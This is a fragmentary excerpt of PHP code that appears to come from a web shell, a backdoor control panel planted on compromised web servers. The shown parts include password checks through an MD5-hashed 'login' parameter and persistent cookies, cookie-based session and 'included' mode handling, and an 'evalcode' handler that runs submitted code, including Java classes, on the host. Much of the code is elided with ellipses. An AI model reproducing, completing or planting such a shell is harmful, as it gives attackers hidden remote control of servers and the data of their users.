...
$s_auth = false; 
if(strlen(trim($s_Nunu))>0){
	if(isset($_COOKIE['PiccHi'])){
		if(strtolower(trim($s_Nunu)) == strtolower(trim($_COOKIE['PiccHi']))) $s_auth = true;
	}
	if(isset($_REQUEST['login'])){
		$s_login = strtolower(md5(trim($_REQUEST['login'])));
		if(strtolower(trim($s_Nunu)) == $s_login){
			setcookie("PiccHi",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_REQUEST['x']) && ($_REQUEST['x']=='logout')){
		$s_reload = (isset($_COOKIE['PiccHi_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
...
if(!empty($_REQUEST['s_Nunu'])){
	if(strtolower(trim($s_Nunu)) == strtolower(trim($_REQUEST['s_Nunu']))){
...
if(isset($_COOKIE['PiccHi_included'])){
	if(strcmp($s_cek1,$s_cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("PiccHi_included", "0" ,time() - $s_login_time);
	...
	if(strcmp($s_cek1,$s_cek2)!=0){
		...
		setcookie("PiccHi_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		...
		if(isset($_REQUEST['evalcode'])){
			...
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					...
					$s_rand = "PiccHi_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
...
<?php
	...
	$s_css = str_replace('fgcolor',$s_Cunu,$s_css);
	echo $s_css;
